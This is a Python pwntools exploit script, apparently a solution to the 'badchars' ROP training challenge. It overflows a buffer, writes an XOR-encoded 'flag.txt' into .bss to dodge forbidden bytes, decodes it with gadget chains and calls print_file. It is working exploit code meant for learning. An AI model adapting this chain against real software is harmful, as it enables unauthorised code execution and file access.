from pwn import *

elf = context.binary = ELF("badchars")
rop = ROP(elf)
p = process(elf.path)

def xor_string(string, key):
    xor_indxs =[]
    output = ""
    for indx, char in enumerate(string):
        if char in badchars:
            nchar = chr(ord(char) ^ key)
            output += nchar
            xor_indxs.append(indx)
            continue
        output += char
    return bytes(output.encode('latin')), xor_indxs

offset = 40

# Gadgets

pop_r12_r15 = p64(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret; 
mov = p64(0x400634) # mov qword ptr [r13], r12; ret;
xor = p64(0x400628) # xor byte ptr [r15], r14b; ret;
pop_rdi  = (rop.find_gadget(['pop rdi', 'ret']))[0]

bss_addr = 0x601038
data2write = 'flag.txt'
badchars = ['x', 'g', 'a', '.']
xor_key = 2 # Just pick a random key.

xoredstr, xor_offsets = xor_string(data2write, xor_key)

# Stage 1 - Write Data into the .bss

payload = b'A' * offset
payload += pop_r12_r15
payload += xoredstr # Populate r12 with the xored string.
payload += p64(bss_addr) # Populate r13 with .bss address.
payload += p64(0xdeadbeefdeadbeef) # Junk for r14
payload += p64(0xdeadbeefdeadbeef) # Junk for r15
payload += mov # Preform the write.

# Stage 2 - Inverse the XOR Operation

for indx in xor_offsets:
    payload += pop_r12_r15
    payload += p64(0xdeadbeefdeadbeef) # Junk for r12
    payload += p64(0xdeadbeefdeadbeef) # Junk for r13
    payload += p64(xor_key) # Populate r14 with the xor key.
    payload += p64(bss_addr + indx) # Populate r15 with a byte of the ciphertext
    payload += xor 

# Stage 3 - Call the print_file function
ret                    = p64(0x00000000004004ee) 
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += ret
payload += p64(elf.plt.print_file)

p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
